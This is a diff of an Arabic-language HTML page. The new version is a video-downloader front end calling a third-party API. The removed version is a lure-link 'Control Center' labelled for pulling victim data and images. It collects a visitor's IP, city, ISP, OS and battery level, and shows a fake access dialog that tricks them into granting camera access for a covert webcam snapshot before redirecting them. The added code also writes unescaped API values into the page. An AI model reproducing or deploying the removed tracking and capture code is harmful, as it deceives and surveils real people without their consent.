@@ -3,184 +3,174 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard v3.0</title>
+    <title>Downloader Pro | تحميل الفيديوهات</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --bg: #030303; --card: #0a0a0a; --neon-blue: #00d2ff; --neon-green: #39ff14; --text: #e0e0e0; --glass: rgba(255, 255, 255, 0.05); }
-        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', Roboto, sans-serif; color: var(--text); overflow-x: hidden; }
-        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        
-        .admin-box { 
-            background: var(--card); padding: 35px; border-radius: 15px; width: 100%; max-width: 450px; 
-            border: 1px solid #1a1a1a; box-shadow: 0 0 30px rgba(0, 210, 255, 0.1);
-            backdrop-filter: blur(10px); transition: 0.4s;
+        :root {
+            --primary-color: #0088cc;
+            --secondary-color: #00d2ff;
+            --bg-color: #f4f7f6;
+            --text-color: #333;
         }
 
-        h2 { text-align: center; color: var(--neon-blue); margin-bottom: 30px; font-weight: 200; letter-spacing: 3px; text-transform: uppercase; }
-        
-        .mode-container { display: flex; gap: 15px; margin-bottom: 25px; }
-        .mode-card { 
-            flex: 1; background: var(--glass); border: 1px solid #222; padding: 20px; border-radius: 12px; 
-            text-align: center; cursor: pointer; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .mode-card.active { border-color: var(--neon-blue); background: rgba(0, 210, 255, 0.05); transform: translateY(-5px); box-shadow: 0 5px 15px rgba(0, 210, 255, 0.2); }
-        .mode-card b { font-size: 14px; display: block; }
-
-        input { 
-            width: 100%; padding: 15px; background: #000; border: 1px solid #222; border-radius: 10px; 
-            color: #fff; margin-bottom: 20px; box-sizing: border-box; transition: 0.3s;
-        }
-        input:focus { border-color: var(--neon-blue); outline: none; }
-
-        .main-btn { 
-            background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: #000; border: none; 
-            padding: 16px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; 
-            font-size: 14px; text-transform: uppercase; transition: 0.3s;
-        }
-        .main-btn:hover { filter: brightness(1.2); transform: scale(1.02); }
-
-        .result-box { 
-            margin-top: 25px; padding: 15px; background: #000; border-radius: 10px; 
-            border: 1px dashed var(--neon-green); display: none; animation: fadeIn 0.5s;
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-color);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
 
-        #log-area { margin-top: 30px; display: none; animation: slideUp 0.6s; }
-        .data-log { background: #050505; padding: 20px; border-radius: 12px; border-right: 3px solid var(--neon-green); }
-        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; border-bottom: 1px solid #111; padding-bottom: 5px; }
-        .info-row span { color: var(--neon-blue); }
+        .container {
+            background: #fff;
+            width: 90%;
+            max-width: 500px;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            text-align: center;
+        }
 
-        /* واجهة الضحية */
-        .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .dialog { background: #080808; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #1a1a1a; width: 85%; max-width: 320px; }
-        .hidden { display: none !important; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        h1 { color: var(--primary-color); margin-bottom: 10px; font-size: 24px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border: 2px solid #eee;
+            border-radius: 12px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus { border-color: var(--primary-color); }
+
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #aaa;
+        }
+
+        button {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s;
+            box-shadow: 0 5px 15px rgba(0,136,204,0.3);
+        }
+
+        button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,136,204,0.4); }
+
+        .loader {
+            display: none;
+            margin: 20px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #results { margin-top: 25px; text-align: right; }
+
+        .download-card {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-right: 5px solid var(--primary-color);
+        }
+
+        .download-card span { font-weight: bold; font-size: 14px; }
+
+        .dl-btn {
+            background: #28a745;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-size: 13px;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div id="admin-panel" class="admin-box">
-        <h2>Control Center</h2>
-        
-        <div class="mode-container">
-            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">
-                <b>سحب بيانات الضحية</b>
-            </div>
-            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">
-                <b>سحب صور</b>
-            </div>
-        </div>
+    <i class="fas fa-cloud-download-alt fa-3x" style="color: var(--primary-color);"></i>
+    <h1>مُحمّل الفيديوهات</h1>
+    <p>يدعم تيك توك، إنستغرام، فيسبوك وأكثر بدون علامة مائية</p>
 
-        <input type="text" id="targetUrl" placeholder="أدخل رابط الوجهة">
-        <button class="main-btn" onclick="generateLink()">توليد الرابط</button>
-
-        <div id="resultBox" class="result-box">
-            <p style="font-size:10px; color:var(--neon-green); margin-bottom:10px;">الرابط المشفر:</p>
-            <input type="text" id="copyLink" readonly onclick="this.select()">
-        </div>
-
-        <div id="log-area">
-            <div class="data-log">
-                <p style="color:var(--neon-blue); font-size:12px; margin-bottom:15px;">📡 التقارير الواردة:</p>
-                <div id="device-data"></div>
-                <div id="image-data" class="hidden">
-                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:15px; border:1px solid #333;">
-                    <a id="download-link" download="report.jpg" style="display:block; color:var(--neon-green); font-size:11px; text-align:center; margin-top:10px; text-decoration:none;">تحميل الوسائط</a>
-                </div>
-            </div>
-        </div>
+    <div class="input-group">
+        <i class="fas fa-link"></i>
+        <input type="text" id="videoUrl" placeholder="ضع رابط الفيديو هنا...">
     </div>
-</div>
 
-<div id="victim-ui" class="victim-overlay hidden">
-    <div class="dialog">
-        <h3 style="color:#fff; font-weight:300;">تأكيد الدخول</h3>
-        <p style="color: #666; font-size:13px;">يرجى السماح بالوصول للكاميرا للمتابعة إلى المحتوى المطلوبة.</p>
-        <button id="cameraBtn" class="main-btn" style="margin-top:15px;">متابعة</button>
-    </div>
-    <video id="video" autoplay playsinline style="display:none"></video>
-    <canvas id="canvas" style="display:none"></canvas>
+    <button onclick="startDownload()">جلب روابط التحميل</button>
+
+    <div id="loader" class="loader"></div>
+    <div id="results"></div>
 </div>
 
 <script>
-    let activeMode = '1'; // 1 = بيانات ، 2 = صور
-    const urlParams = new URLSearchParams(window.location.search);
-    const vMode = urlParams.get('v');
+    async function startDownload() {
+        const url = document.getElementById('videoUrl').value;
+        const loader = document.getElementById('loader');
+        const results = document.getElementById('results');
 
-    function selectMode(mode, id) {
-        activeMode = mode;
-        document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-    }
+        if (!url) return alert("يرجى لصق الرابط أولاً!");
 
-    if (vMode) {
-        document.getElementById('admin-panel').classList.add('hidden');
-        
-        async function startProtocol() {
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
-            
-            const payload = {
-                ip: ipData.ip || "N/A",
-                city: ipData.city || "Unknown",
-                isp: ipData.org || "Unknown",
-                os: navigator.platform,
-                batt: batt ? (batt.level * 100).toFixed(0) + "%" : "N/A"
-            };
-            localStorage.setItem('rep_info', JSON.stringify(payload));
+        results.innerHTML = "";
+        loader.style.display = "block";
 
-            const redir = localStorage.getItem('redir_to') || 'https://google.com';
+        try {
+            // استخدام API قوية تدعم عدة منصات
+            const response = await fetch(`https://api.vkrdownloader.org/server/?vkr=${encodeURIComponent(url)}`);
+            const data = await response.json();
 
-            if (vMode === '1') {
-                window.location.href = redir;
+            loader.style.display = "none";
+
+            if (data.data && data.data.downloads) {
+                data.data.downloads.forEach(item => {
+                    const card = `
+                        <div class="download-card">
+                            <span>جودة: ${item.format_id || 'HD'} (${item.ext})</span>
+                            <a href="${item.url}" class="dl-btn" target="_blank"><i class="fas fa-download"></i> تحميل</a>
+                        </div>
+                    `;
+                    results.innerHTML += card;
+                });
             } else {
-                document.getElementById('victim-ui').classList.remove('hidden');
-                document.getElementById('cameraBtn').onclick = async () => {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                        const video = document.getElementById('video');
-                        video.srcObject = stream;
-                        setTimeout(() => {
-                            const canvas = document.getElementById('canvas');
-                            canvas.width = 640; canvas.height = 480;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            localStorage.setItem('rep_img', canvas.toDataURL('image/jpeg'));
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = redir;
-                        }, 800);
-                    } catch { window.location.href = redir; }
-                };
+                results.innerHTML = "<p style='color:red;'>عذراً، لم نتمكن من العثور على الفيديو. تأكد أن الحساب عام.</p>";
             }
+        } catch (error) {
+            loader.style.display = "none";
+            results.innerHTML = "<p style='color:red;'>حدث خطأ في الاتصال بالخادم.</p>";
         }
-        startProtocol();
     }
-
-    function generateLink() {
-        const val = document.getElementById('targetUrl').value;
-        if (!val) return;
-        localStorage.setItem('redir_to', val);
-        document.getElementById('copyLink').value = window.location.href.split('?')[0] + "?v=" + activeMode;
-        document.getElementById('resultBox').style.display = 'block';
-    }
-
-    window.addEventListener('storage', (e) => {
-        document.getElementById('log-area').style.display = 'block';
-        if (e.key === 'rep_info') {
-            const d = JSON.parse(e.newValue);
-            document.getElementById('device-data').innerHTML = `
-                <div class="info-row">عنوان IP: <span>${d.ip}</span></div>
-                <div class="info-row">المدينة: <span>${d.city}</span></div>
-                <div class="info-row">المزود: <span>${d.isp}</span></div>
-                <div class="info-row">نظام التشغيل: <span>${d.os}</span></div>
-                <div class="info-row">البطارية: <span>${d.batt}</span></div>
-            `;
-        }
-        if (e.key === 'rep_img') {
-            document.getElementById('image-data').classList.remove('hidden');
-            document.getElementById('captured-img').src = e.newValue;
-            document.getElementById('download-link').href = e.newValue;
-        }
-    });
 </script>
+
 </body>
 </html>
